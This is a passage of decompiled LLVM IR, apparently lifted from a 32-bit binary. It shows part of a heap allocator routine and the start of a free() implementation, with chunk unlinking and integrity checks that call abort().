  %v1_804a71a = icmp eq i1 %v12_804a718, false
  br i1 %v1_804a71a, label %dec_label_pc_804a754, label %dec_label_pc_804a71c

dec_label_pc_804a71c:                             ; preds = %dec_label_pc_804a703
  %v1_804a71c = add i32 %v3_804a712, 8
  %v2_804a71c = inttoptr i32 %v1_804a71c to i32*
  %v3_804a71c = load i32, i32* %v2_804a71c, align 4
  %v15_804a71c = icmp eq i32 %v3_804a71c, %v3_804a715
  %v1_804a71f = icmp eq i1 %v15_804a71c, false
  br i1 %v1_804a71f, label %dec_label_pc_804a754, label %dec_label_pc_804a721

dec_label_pc_804a721:                             ; preds = %dec_label_pc_804a71c
  %v5_804a721 = add i32 %v2_804a703, %v1_804a6f3
  store i32 %v5_804a721, i32* %edi.global-to-local, align 4
  store i32 %v3_804a712, i32* %v2_804a715, align 4
  %v0_804a728 = load i32, i32* @esi, align 4
  %v1_804a728 = load i32, i32* @ebx, align 4
  %v2_804a728 = add i32 %v1_804a728, 8
  %v3_804a728 = inttoptr i32 %v2_804a728 to i32*
  store i32 %v0_804a728, i32* %v3_804a728, align 4
  %v2_804a72b.pre = load i32, i32* %stack_var_-40, align 4
  %v0_804a731.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a72b

dec_label_pc_804a72b:                             ; preds = %dec_label_pc_804a6e7, %dec_label_pc_804a721
  %v1_804a73d = phi i32 [ %v2_804a6f6, %dec_label_pc_804a6e7 ], [ %v0_804a731.pre, %dec_label_pc_804a721 ]
  %v2_804a72b = phi i32 [ %v3_804a6f9, %dec_label_pc_804a6e7 ], [ %v2_804a72b.pre, %dec_label_pc_804a721 ]
  %v1_804a72e = and i32 %v2_804a72b, -4
  store i32 %v1_804a72e, i32* @esi, align 4
  %v1_804a731 = load i32, i32* @ebp, align 4
  %v2_804a731 = add i32 %v1_804a731, 44
  %v3_804a731 = inttoptr i32 %v2_804a731 to i32*
  %v4_804a731 = load i32, i32* %v3_804a731, align 4
  %v15_804a731 = icmp eq i32 %v1_804a73d, %v4_804a731
  br i1 %v15_804a731, label %dec_label_pc_804a781, label %dec_label_pc_804a736

dec_label_pc_804a736:                             ; preds = %dec_label_pc_804a72b
  %v2_804a736 = add i32 %v1_804a73d, 4
  %v3_804a736 = add i32 %v1_804a72e, %v2_804a736
  %v4_804a736 = inttoptr i32 %v3_804a736 to i32*
  %v5_804a736 = load i32, i32* %v4_804a736, align 4
  %v1_804a73a = urem i32 %v5_804a736, 2
  %v2_804a73a = icmp eq i32 %v1_804a73a, 0
  store i32 %v1_804a73a, i32* %eax.global-to-local, align 4
  %v3_804a73d = inttoptr i32 %v2_804a736 to i32*
  store i32 %v1_804a72e, i32* %v3_804a73d, align 4
  %v1_804a742 = icmp eq i1 %v2_804a73a, false
  br i1 %v1_804a742, label %dec_label_pc_804a761, label %dec_label_pc_804a744

dec_label_pc_804a744:                             ; preds = %dec_label_pc_804a736
  %v0_804a744 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a744 = add i32 %v0_804a744, 8
  %v2_804a744 = inttoptr i32 %v1_804a744 to i32*
  %v3_804a744 = load i32, i32* %v2_804a744, align 4
  store i32 %v3_804a744, i32* @ebx, align 4
  %v1_804a747 = add i32 %v0_804a744, 12
  %v2_804a747 = inttoptr i32 %v1_804a747 to i32*
  %v3_804a747 = load i32, i32* %v2_804a747, align 4
  store i32 %v3_804a747, i32* %eax.global-to-local, align 4
  %v1_804a74a = add i32 %v3_804a744, 12
  %v2_804a74a = inttoptr i32 %v1_804a74a to i32*
  %v3_804a74a = load i32, i32* %v2_804a74a, align 4
  %v15_804a74a = icmp eq i32 %v3_804a74a, %v0_804a744
  %v1_804a74d = icmp eq i1 %v15_804a74a, false
  br i1 %v1_804a74d, label %dec_label_pc_804a754, label %dec_label_pc_804a74f

dec_label_pc_804a74f:                             ; preds = %dec_label_pc_804a744
  %v1_804a74f = add i32 %v3_804a747, 8
  %v2_804a74f = inttoptr i32 %v1_804a74f to i32*
  %v3_804a74f = load i32, i32* %v2_804a74f, align 4
  %v15_804a74f = icmp eq i32 %v3_804a74f, %v0_804a744
  br i1 %v15_804a74f, label %dec_label_pc_804a759, label %dec_label_pc_804a754

dec_label_pc_804a754:                             ; preds = %dec_label_pc_804a74f, %dec_label_pc_804a744, %dec_label_pc_804a71c, %dec_label_pc_804a703
  %v0_804a754 = call i32 @abort()
  store i32 %v0_804a754, i32* %eax.global-to-local, align 4
  %v1_804a75b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a759

dec_label_pc_804a759:                             ; preds = %dec_label_pc_804a74f, %dec_label_pc_804a754
  %v1_804a75b = phi i32 [ %v3_804a744, %dec_label_pc_804a74f ], [ %v1_804a75b.pre, %dec_label_pc_804a754 ]
  %v0_804a75b = phi i32 [ %v3_804a747, %dec_label_pc_804a74f ], [ %v0_804a754, %dec_label_pc_804a754 ]
  %v0_804a759 = load i32, i32* %edi.global-to-local, align 4
  %v1_804a759 = load i32, i32* @esi, align 4
  %v2_804a759 = add i32 %v1_804a759, %v0_804a759
  store i32 %v2_804a759, i32* %edi.global-to-local, align 4
  %v2_804a75b = add i32 %v1_804a75b, 12
  %v3_804a75b = inttoptr i32 %v2_804a75b to i32*
  store i32 %v0_804a75b, i32* %v3_804a75b, align 4
  %v0_804a75e = load i32, i32* @ebx, align 4
  %v1_804a75e = load i32, i32* %eax.global-to-local, align 4
  %v2_804a75e = add i32 %v1_804a75e, 8
  %v3_804a75e = inttoptr i32 %v2_804a75e to i32*
  store i32 %v0_804a75e, i32* %v3_804a75e, align 4
  br label %dec_label_pc_804a761

dec_label_pc_804a761:                             ; preds = %dec_label_pc_804a736, %dec_label_pc_804a759
  store i32 %v1_804a6ba, i32* %ebx.global-to-local, align 4
  %v3_804a765 = load i32, i32* %v2_804a765, align 4
  store i32 %v3_804a765, i32* %edx.global-to-local, align 4
  %v0_804a768 = load i32, i32* @ecx, align 4
  store i32 %v0_804a768, i32* %v2_804a765, align 4
  %v0_804a76b = load i32, i32* @ecx, align 4
  %v1_804a76b = load i32, i32* %edx.global-to-local, align 4
  %v2_804a76b = add i32 %v1_804a76b, 12
  %v3_804a76b = inttoptr i32 %v2_804a76b to i32*
  store i32 %v0_804a76b, i32* %v3_804a76b, align 4
  %v0_804a76e = load i32, i32* %edi.global-to-local, align 4
  %v1_804a770 = or i32 %v0_804a76e, 1
  store i32 %v1_804a770, i32* %eax.global-to-local, align 4
  %v1_804a773 = load i32, i32* @ecx, align 4
  %v2_804a773 = add i32 %v1_804a773, 4
  %v3_804a773 = inttoptr i32 %v2_804a773 to i32*
  store i32 %v1_804a770, i32* %v3_804a773, align 4
  %v0_804a776 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a776 = load i32, i32* @ecx, align 4
  %v2_804a776 = add i32 %v1_804a776, 12
  %v3_804a776 = inttoptr i32 %v2_804a776 to i32*
  store i32 %v0_804a776, i32* %v3_804a776, align 4
  %v0_804a779 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a779 = load i32, i32* @ecx, align 4
  %v2_804a779 = add i32 %v1_804a779, 8
  %v3_804a779 = inttoptr i32 %v2_804a779 to i32*
  store i32 %v0_804a779, i32* %v3_804a779, align 4
  %v0_804a77c = load i32, i32* %edi.global-to-local, align 4
  %v1_804a77c = load i32, i32* @ecx, align 4
  %v3_804a77c = add i32 %v1_804a77c, %v0_804a77c
  %v4_804a77c = inttoptr i32 %v3_804a77c to i32*
  store i32 %v0_804a77c, i32* %v4_804a77c, align 4
  br label %dec_label_pc_804a78d

dec_label_pc_804a781:                             ; preds = %dec_label_pc_804a72b
  %v0_804a781 = load i32, i32* %edi.global-to-local, align 4
  %v2_804a781 = add i32 %v0_804a781, %v1_804a72e
  %v1_804a784 = or i32 %v2_804a781, 1
  store i32 %v1_804a784, i32* %eax.global-to-local, align 4
  %v1_804a787 = load i32, i32* @ecx, align 4
  %v2_804a787 = add i32 %v1_804a787, 4
  %v3_804a787 = inttoptr i32 %v2_804a787 to i32*
  store i32 %v1_804a784, i32* %v3_804a787, align 4
  %v0_804a78a = load i32, i32* @ecx, align 4
  %v1_804a78a = load i32, i32* @ebp, align 4
  %v2_804a78a = add i32 %v1_804a78a, 44
  %v3_804a78a = inttoptr i32 %v2_804a78a to i32*
  store i32 %v0_804a78a, i32* %v3_804a78a, align 4
  br label %dec_label_pc_804a78d

dec_label_pc_804a78d:                             ; preds = %dec_label_pc_804a761, %dec_label_pc_804a781
  store i32 %v3_804a6e7, i32* @ecx, align 4
  %v1_804a791 = icmp eq i32 %v3_804a6e7, 0
  %v1_804a793 = icmp eq i1 %v1_804a791, false
  br i1 %v1_804a793, label %dec_label_pc_804a6e7, label %dec_label_pc_804a799

dec_label_pc_804a799:                             ; preds = %dec_label_pc_804a78d, %dec_label_pc_804a6d3
  store i32 %v4_804a6c4, i32* %eax.global-to-local, align 4
  %v15_804a79d = icmp eq i32 %v0_804a6e1, %v4_804a6c4
  br i1 %v15_804a79d, label %dec_label_pc_804a80c.loopexit, label %dec_label_pc_804a7a3

dec_label_pc_804a7a3:                             ; preds = %dec_label_pc_804a799
  %v4_804a7a3 = add i32 %v0_804a6e1, 4
  br label %dec_label_pc_804a6d3

dec_label_pc_804a7ad:                             ; preds = %entry, %dec_label_pc_804a7ad
  %v1_804a7ad = phi i32 [ %v1_804a7b7, %dec_label_pc_804a7ad ], [ 1, %entry ]
  %v0_804a7ad = phi i32 [ %v0_804a7bd, %dec_label_pc_804a7ad ], [ %tmp15, %entry ]
  %v2_804a7ad = mul i32 %v1_804a7ad, 8
  %v3_804a7ad = add i32 %v0_804a7ad, 44
  %v4_804a7ad = add i32 %v3_804a7ad, %v2_804a7ad
  store i32 %v4_804a7ad, i32* %eax.global-to-local, align 4
  %v2_804a7b1 = add i32 %v4_804a7ad, 12
  %v3_804a7b1 = inttoptr i32 %v2_804a7b1 to i32*
  store i32 %v4_804a7ad, i32* %v3_804a7b1, align 4
  %v0_804a7b4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a7b4 = add i32 %v0_804a7b4, 8
  %v3_804a7b4 = inttoptr i32 %v2_804a7b4 to i32*
  store i32 %v0_804a7b4, i32* %v3_804a7b4, align 4
  %v0_804a7b7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a7b7 = add i32 %v0_804a7b7, 1
  store i32 %v1_804a7b7, i32* %edx.global-to-local, align 4
  %v7_804a7bb = icmp sgt i32 %v1_804a7b7, 95
  %v0_804a7bd = load i32, i32* @ebp, align 4
  br i1 %v7_804a7bb, label %dec_label_pc_804a7bd, label %dec_label_pc_804a7ad

dec_label_pc_804a7bd:                             ; preds = %dec_label_pc_804a7ad
  %v1_804a7bd = add i32 %v0_804a7bd, 840
  %v2_804a7bd = inttoptr i32 %v1_804a7bd to i32*
  store i32 0, i32* %v2_804a7bd, align 4
  %v0_804a7c7 = load i32, i32* @ebp, align 4
  %v1_804a7c7 = add i32 %v0_804a7c7, 852
  %v2_804a7c7 = inttoptr i32 %v1_804a7c7 to i32*
  store i32 65536, i32* %v2_804a7c7, align 4
  %v0_804a7d1 = load i32, i32* @ebp, align 4
  %v1_804a7d1 = add i32 %v0_804a7d1, 844
  %v2_804a7d1 = inttoptr i32 %v1_804a7d1 to i32*
  store i32 262144, i32* %v2_804a7d1, align 4
  %v0_804a7db = load i32, i32* @ebp, align 4
  %v1_804a7db = add i32 %v0_804a7db, 836
  %v2_804a7db = inttoptr i32 %v1_804a7db to i32*
  store i32 262144, i32* %v2_804a7db, align 4
  %v0_804a7e5 = load i32, i32* @ebp, align 4
  %v1_804a7e5 = add i32 %v0_804a7e5, 864
  %v2_804a7e5 = inttoptr i32 %v1_804a7e5 to i32*
  %v3_804a7e5 = load i32, i32* %v2_804a7e5, align 4
  %v4_804a7e5 = or i32 %v3_804a7e5, 1
  store i32 %v4_804a7e5, i32* %v2_804a7e5, align 4
  %v0_804a7ec = load i32, i32* @ebp, align 4
  %v1_804a7ec = inttoptr i32 %v0_804a7ec to i32*
  %v2_804a7ec = load i32, i32* %v1_804a7ec, align 4
  %v1_804a7ef = urem i32 %v2_804a7ec, 4
  %v1_804a7f2 = or i32 %v1_804a7ef, 72
  store i32 %v1_804a7f2, i32* %v1_804a7ec, align 4
  %v0_804a7f8 = load i32, i32* @ebp, align 4
  %v1_804a7f8 = add i32 %v0_804a7f8, 52
  store i32 %v1_804a7f8, i32* %eax.global-to-local, align 4
  %v2_804a7fb = add i32 %v0_804a7f8, 44
  %v3_804a7fb = inttoptr i32 %v2_804a7fb to i32*
  store i32 %v1_804a7f8, i32* %v3_804a7fb, align 4
  store i32 30, i32* %stack_var_-44, align 4
  %v1_804a800 = call i32 @sysconf(i32 30)
  store i32 %v1_804a800, i32* %eax.global-to-local, align 4
  %v1_804a805 = load i32, i32* @ebp, align 4
  %v2_804a805 = add i32 %v1_804a805, 860
  %v3_804a805 = inttoptr i32 %v2_804a805 to i32*
  store i32 %v1_804a800, i32* %v3_804a805, align 4
  %v2_804a80b = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_804a80b, i32* @ecx, align 4
  %v0_804a813.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a80c

dec_label_pc_804a80c.loopexit:                    ; preds = %dec_label_pc_804a799
  br label %dec_label_pc_804a80c

dec_label_pc_804a80c:                             ; preds = %dec_label_pc_804a80c.loopexit, %dec_label_pc_804a7bd
  %v0_804a813 = phi i32 [ %v4_804a6c4, %dec_label_pc_804a80c.loopexit ], [ %v0_804a813.pre, %dec_label_pc_804a7bd ]
  store i32 %v0_804a69c, i32* @ebx, align 4
  store i32 %v0_804a69b, i32* @esi, align 4
  store i32 %v0_804a699, i32* @ebp, align 4
  ret i32 %v0_804a813

; uselistorder directives
  uselistorder i32 %v1_804a7b7, { 1, 2, 0 }
  uselistorder i32 %v0_804a7b4, { 1, 0 }
  uselistorder i32 %v4_804a7ad, { 1, 0, 2 }
  uselistorder i32 %v0_804a77c, { 1, 0 }
  uselistorder i32 %v1_804a73a, { 1, 0 }
  uselistorder i32 %v2_804a736, { 1, 0 }
  uselistorder i32 %v1_804a72e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804a73d, { 1, 0 }
  uselistorder i32 %v3_804a6e7, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804a703, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804a6e1, { 1, 0, 3, 2 }
  uselistorder i32 %v4_804a6c4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804a6ba, { 2, 1, 0, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 9, 1, 2, 3, 5, 4, 6, 7, 8, 10 }
  uselistorder i32* %edi.global-to-local, { 5, 2, 3, 0, 4, 1, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 8, 9, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804a7ad, { 1, 0 }
  uselistorder label %dec_label_pc_804a78d, { 1, 0 }
  uselistorder label %dec_label_pc_804a761, { 1, 0 }
  uselistorder label %dec_label_pc_804a759, { 1, 0 }
  uselistorder label %dec_label_pc_804a72b, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_804a814 = load i32, i32* @ebp, align 4
  %v0_804a815 = load i32, i32* @edi, align 4
  %v0_804a816 = load i32, i32* @esi, align 4
  %v0_804a817 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  %v1_804a81f = icmp eq i32 %arg1, 0
  br i1 %v1_804a81f, label %dec_label_pc_804a99b, label %dec_label_pc_804a827

dec_label_pc_804a827:                             ; preds = %entry
  %v2_804a831 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804a831, i32* %eax.global-to-local, align 4
  %v4_804a836 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134525440, i32 ptrtoint (i32* @global_var_8053344.33 to i32))
  store i32 %v4_804a836, i32* %eax.global-to-local, align 4
  %v1_804a840 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053344.33 to i32))
  store i32 %v1_804a840, i32* %eax.global-to-local, align 4
  %v1_804a845 = add i32 %arg1, -8
  store i32 %v1_804a845, i32* @ecx, align 4
  store i32 %v1_804a845, i32* @edi, align 4
  %v1_804a84a = add i32 %arg1, -4
  %v2_804a84a = inttoptr i32 %v1_804a84a to i32*
  %v3_804a84a = load i32, i32* %v2_804a84a, align 4
  store i32 %v3_804a84a, i32* %edx.global-to-local, align 4
  %v1_804a84f = and i32 %v3_804a84a, -4
  %v4_804a84f = trunc i32 %v1_804a84f to i8
  store i32 %v1_804a84f, i32* @ebx, align 4
  %v0_804a852 = load i8, i8* @global_var_8055810.34, align 1
  %v1_804a852 = sext i8 %v0_804a852 to i32
  store i32 %v1_804a852, i32* %eax.global-to-local, align 4
  %v8_804a85c = icmp ugt i8 %v4_804a84f, %v0_804a852
  br i1 %v8_804a85c, label %dec_label_pc_804a881, label %dec_label_pc_804a85e

dec_label_pc_804a85e:                             ; preds = %dec_label_pc_804a827
  %v1_804a85e = or i32 %v1_804a852, 3
  %v3_804a85e = trunc i32 %v1_804a85e to i8
  store i32 %v1_804a85e, i32* %eax.global-to-local, align 4
  store i8 %v3_804a85e, i8* @global_var_8055810.34, align 16
  %v2_804a868 = udiv i32 %v3_804a84a, 8
  store i32 %v2_804a868, i32* %edx.global-to-local, align 4
  %v1_804a86b = mul nuw i32 %v2_804a868, 4
  %v2_804a86b = add i32 %v1_804a86b, ptrtoint (i32* @global_var_805580c.35 to i32)
  %v3_804a86b = inttoptr i32 %v2_804a86b to i32*
  %v4_804a86b = load i32, i32* %v3_804a86b, align 4
  store i32 %v4_804a86b, i32* %eax.global-to-local, align 4
  %v3_804a872 = inttoptr i32 %arg1 to i32*
  store i32 %v4_804a86b, i32* %v3_804a872, align 4
  %v0_804a875 = load i32, i32* @ecx, align 4
  %v1_804a875 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a875 = mul i32 %v1_804a875, 4
  %v3_804a875 = add i32 %v2_804a875, ptrtoint (i32* @global_var_805580c.35 to i32)
  %v4_804a875 = inttoptr i32 %v3_804a875 to i32*
  store i32 %v0_804a875, i32* %v4_804a875, align 4
  br label %dec_label_pc_804a98d

dec_label_pc_804a881:                             ; preds = %dec_label_pc_804a827
  %v1_804a881 = trunc i32 %v3_804a84a to i8
  %v2_804a881 = and i8 %v1_804a881, 2
  %v3_804a881 = icmp eq i8 %v2_804a881, 0
  %v5_804a881 = zext i8 %v2_804a881 to i32
  %v7_804a881 = and i32 %v3_804a84a, -256
  %v8_804a881 = or i32 %v5_804a881, %v7_804a881
  store i32 %v8_804a881, i32* %edx.global-to-local, align 4
  %v1_804a884 = icmp eq i1 %v3_804a881, false
  br i1 %v1_804a884, label %dec_label_pc_804a970, label %dec_label_pc_804a88a

dec_label_pc_804a88a:                             ; preds = %dec_label_pc_804a881
  %v1_804a88a = or i32 %v1_804a852, 1
  %v3_804a88a = trunc i32 %v1_804a88a to i8
  store i32 %v1_804a88a, i32* %eax.global-to-local, align 4
  store i8 %v3_804a88a, i8* @global_var_8055810.34, align 16
  %v2_804a892 = add i32 %v1_804a84f, %v1_804a845
  store i32 %v2_804a892, i32* @esi, align 4
  %v1_804a895 = add i32 %v2_804a892, 4
  %v2_804a895 = inttoptr i32 %v1_804a895 to i32*
  %v3_804a895 = load i32, i32* %v2_804a895, align 4
  store i32 %v3_804a895, i32* %eax.global-to-local, align 4
  store i32 %v3_804a895, i32* %stack_var_-36, align 4
  %v2_804a89b = inttoptr i32 %v1_804a84a to i8*
  %v3_804a89b = load i8, i8* %v2_804a89b, align 1
  %v4_804a89b = urem i8 %v3_804a89b, 2
  %v5_804a89b = icmp eq i8 %v4_804a89b, 0
  %v1_804a89f = icmp eq i1 %v5_804a89b, false
  br i1 %v1_804a89f, label %dec_label_pc_804a8c2, label %dec_label_pc_804a8a1

dec_label_pc_804a8a1:                             ; preds = %dec_label_pc_804a88a
  %v2_804a8a1 = inttoptr i32 %v1_804a845 to i32*
  %v3_804a8a1 = load i32, i32* %v2_804a8a1, align 4
  store i32 %v3_804a8a1, i32* @ebp, align 4
  %v2_804a8a6 = sub i32 %v1_804a845, %v3_804a8a1
  store i32 %v2_804a8a6, i32* %eax.global-to-local, align 4
  %v1_804a8a8 = add i32 %v2_804a8a6, 8
  %v2_804a8a8 = inttoptr i32 %v1_804a8a8 to i32*
  %v3_804a8a8 = load i32, i32* %v2_804a8a8, align 4
  store i32 %v3_804a8a8, i32* %ecx.global-to-local, align 4
  %v1_804a8ab = add i32 %v2_804a8a6, 12
  %v2_804a8ab = inttoptr i32 %v1_804a8ab to i32*
  %v3_804a8ab = load i32, i32* %v2_804a8ab, align 4
  store i32 %v3_804a8ab, i32* %edx.global-to-local, align 4
  %v1_804a8ae = add i32 %v3_804a8a8, 12
  %v2_804a8ae = inttoptr i32 %v1_804a8ae to i32*
  %v3_804a8ae = load i32, i32* %v2_804a8ae, align 4
  store i32 %v3_804a8ae, i32* @edi, align 4
  %v12_804a8b1 = icmp eq i32 %v3_804a8ae, %v2_804a8a6
  %v1_804a8b3 = icmp eq i1 %v12_804a8b1, false
  br i1 %v1_804a8b3, label %dec_label_pc_804a8ee, label %dec_label_pc_804a8b5

dec_label_pc_804a8b5:                             ; preds = %dec_label_pc_804a8a1
  %v1_804a8b5 = add i32 %v3_804a8ab, 8
  %v2_804a8b5 = inttoptr i32 %v1_804a8b5 to i32*
  %v3_804a8b5 = load i32, i32* %v2_804a8b5, align 4
  %v15_804a8b5 = icmp eq i32 %v3_804a8b5, %v3_804a8ae
  %v1_804a8b8 = icmp eq i1 %v15_804a8b5, false
  br i1 %v1_804a8b8, label %dec_label_pc_804a8ee, label %dec_label_pc_804a8ba

dec_label_pc_804a8ba:                             ; preds = %dec_label_pc_804a8b5
  %v2_804a8ba = add i32 %v3_804a8a1, %v1_804a84f
  store i32 %v2_804a8ba, i32* @ebx, align 4
  store i32 %v3_804a8ab, i32* %v2_804a8ae, align 4
  %v0_804a8bf = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a8bf = load i32, i32* %edx.global-to-local, align 4
  %v2_804a8bf = add i32 %v1_804a8bf, 8
  %v3_804a8bf = inttoptr i32 %v2_804a8bf to i32*
  store i32 %v0_804a8bf, i32* %v3_804a8bf, align 4
  %v2_804a8c2.pre = load i32, i32* %stack_var_-36, align 4
  %v0_804a8c8.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a8c2

dec_label_pc_804a8c2:                             ; preds = %dec_label_pc_804a88a, %dec_label_pc_804a8ba
  %v1_804a8d7 = phi i32 [ %v2_804a892, %dec_label_pc_804a88a ], [ %v0_804a8c8.pre, %dec_label_pc_804a8ba ]
  %v2_804a8c2 = phi i32 [ %v3_804a895, %dec_label_pc_804a88a ], [ %v2_804a8c2.pre, %dec_label_pc_804a8ba ]
  %v1_804a8c5 = and i32 %v2_804a8c2, -4
  store i32 %v1_804a8c5, i32* @ecx, align 4
  %v1_804a8c8 = load i32, i32* @global_var_805583c.36, align 4
  %v12_804a8c8 = icmp eq i32 %v1_804a8d7, %v1_804a8c8
  br i1 %v12_804a8c8, label %dec_label_pc_804a920, label %dec_label_pc_804a8d0

dec_label_pc_804a8d0:                             ; preds = %dec_label_pc_804a8c2
  %v2_804a8d0 = add i32 %v1_804a8d7, 4
  %v3_804a8d0 = add i32 %v1_804a8c5, %v2_804a8d0
  %v4_804a8d0 = inttoptr i32 %v3_804a8d0 to i32*
  %v5_804a8d0 = load i32, i32* %v4_804a8d0, align 4
  %v1_804a8d4 = urem i32 %v5_804a8d0, 2
  %v2_804a8d4 = icmp eq i32 %v1_804a8d4, 0
  store i32 %v1_804a8d4, i32* %eax.global-to-local, align 4
  %v3_804a8d7 = inttoptr i32 %v2_804a8d0 to i32*
  store i32 %v1_804a8c5, i32* %v3_804a8d7, align 4
  %v1_804a8dc = icmp eq i1 %v2_804a8d4, false
  br i1 %v1_804a8dc, label %dec_label_pc_804a8fb, label %dec_label_pc_804a8de

dec_label_pc_804a8de:                             ; preds = %dec_label_pc_804a8d0
  %v0_804a8de = load i32, i32* @esi, align 4
  %v1_804a8de = add i32 %v0_804a8de, 8
  %v2_804a8de = inttoptr i32 %v1_804a8de to i32*
  %v3_804a8de = load i32, i32* %v2_804a8de, align 4
  store i32 %v3_804a8de, i32* @edx, align 4
  %v1_804a8e1 = add i32 %v0_804a8de, 12
  %v2_804a8e1 = inttoptr i32 %v1_804a8e1 to i32*
  %v3_804a8e1 = load i32, i32* %v2_804a8e1, align 4
  store i32 %v3_804a8e1, i32* %eax.global-to-local, align 4
  %v1_804a8e4 = add i32 %v3_804a8de, 12
  %v2_804a8e4 = inttoptr i32 %v1_804a8e4 to i32*
  %v3_804a8e4 = load i32, i32* %v2_804a8e4, align 4
  %v15_804a8e4 = icmp eq i32 %v3_804a8e4, %v0_804a8de
  %v1_804a8e7 = icmp eq i1 %v15_804a8e4, false
  br i1 %v1_804a8e7, label %dec_label_pc_804a8ee, label %dec_label_pc_804a8e9

dec_label_pc_804a8e9:                             ; preds = %dec_label_pc_804a8de
  %v1_804a8e9 = add i32 %v3_804a8e1, 8
  %v2_804a8e9 = inttoptr i32 %v1_804a8e9 to i32*
  %v3_804a8e9 = load i32, i32* %v2_804a8e9, align 4
  %v15_804a8e9 = icmp eq i32 %v3_804a8e9, %v0_804a8de
  br i1 %v15_804a8e9, label %dec_label_pc_804a8f3, label %dec_label_pc_804a8ee

dec_label_pc_804a8ee:                             ; preds = %dec_label_pc_804a8e9, %dec_label_pc_804a8de, %dec_label_pc_804a8b5, %dec_label_pc_804a8a1
  %v0_804a8ee = call i32 @abort()
  store i32 %v0_804a8ee, i32* %eax.global-to-local, align 4
  %v1_804a8f3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804a8f3

dec_label_pc_804a8f3:                             ; preds = %dec_label_pc_804a8e9, %dec_label_pc_804a8ee
  %v1_804a8f3 = phi i32 [ %v3_804a8de, %dec_label_pc_804a8e9 ], [ %v1_804a8f3.pre, %dec_label_pc_804a8ee ]
  %v0_804a8f3 = phi i32 [ %v3_804a8e1, %dec_label_pc_804a8e9 ], [ %v0_804a8ee, %dec_label_pc_804a8ee ]
  %v2_804a8f3 = add i32 %v1_804a8f3, 12
  %v3_804a8f3 = inttoptr i32 %v2_804a8f3 to i32*
  store i32 %v0_804a8f3, i32* %v3_804a8f3, align 4
  %v0_804a8f6 = load i32, i32* @edx, align 4
  %v1_804a8f6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a8f6 = add i32 %v1_804a8f6, 8
  %v3_804a8f6 = inttoptr i32 %v2_804a8f6 to i32*
  store i32 %v0_804a8f6, i32* %v3_804a8f6, align 4
  %v0_804a8f9 = load i32, i32* @ebx, align 4
  %v1_804a8f9 = load i32, i32* @ecx, align 4
  %v2_804a8f9 = add i32 %v1_804a8f9, %v0_804a8f9
  store i32 %v2_804a8f9, i32* @ebx, align 4
  br label %dec_label_pc_804a8fb

dec_label_pc_804a8fb:                             ; preds = %dec_label_pc_804a8d0, %dec_label_pc_804a8f3
  %v0_804a8fb = load i32, i32* @global_var_805584c.38, align 4
  store i32 %v0_804a8fb, i32* %eax.global-to-local, align 4
  %v0_804a900 = load i32, i32* @edi, align 4
  %v1_804a900 = add i32 %v0_804a900, 12
  %v2_804a900 = inttoptr i32 %v1_804a900 to i32*
  store i32 ptrtoint (i32* @global_var_8055844.40 to i32), i32* %v2_804a900, align 4
  %v0_804a907 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a907 = load i32, i32* @edi, align 4
  %v2_804a907 = add i32 %v1_804a907, 8
  %v3_804a907 = inttoptr i32 %v2_804a907 to i32*
  store i32 %v0_804a907, i32* %v3_804a907, align 4
  %v0_804a90a = load i32, i32* @edi, align 4
  store i32 %v0_804a90a, i32* @global_var_805584c.38, align 4
  %v1_804a910 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a910 = add i32 %v1_804a910, 12
  %v3_804a910 = inttoptr i32 %v2_804a910 to i32*
  store i32 %v0_804a90a, i32* %v3_804a910, align 4
  %v0_804a913 = load i32, i32* @ebx, align 4
  %v1_804a915 = or i32 %v0_804a913, 1
  store i32 %v1_804a915, i32* %eax.global-to-local, align 4
  %v1_804a918 = load i32, i32* @edi, align 4
  %v2_804a918 = add i32 %v1_804a918, 4
  %v3_804a918 = inttoptr i32 %v2_804a918 to i32*
  store i32 %v1_804a915, i32* %v3_804a918, align 4
  %v0_804a91b = load i32, i32* @ebx, align 4
  %v1_804a91b = load i32, i32* @edi, align 4
  %v3_804a91b = add i32 %v1_804a91b, %v0_804a91b
  %v4_804a91b = inttoptr i32 %v3_804a91b to i32*
  store i32 %v0_804a91b, i32* %v4_804a91b, align 4
  br label %dec_label_pc_804a930

dec_label_pc_804a920:                             ; preds = %dec_label_pc_804a8c2
  %v0_804a920 = load i32, i32* @ebx, align 4
  %v2_804a920 = add i32 %v0_804a920, %v1_804a8c5
  store i32 %v2_804a920, i32* @ebx, align 4
  %v1_804a924 = or i32 %v2_804a920, 1
  store i32 %v1_804a924, i32* %eax.global-to-local, align 4
  %v1_804a927 = load i32, i32* @edi, align 4
  %v2_804a927 = add i32 %v1_804a927, 4
  %v3_804a927 = inttoptr i32 %v2_804a927 to i32*
  store i32 %v1_804a924, i32* %v3_804a927, align 4
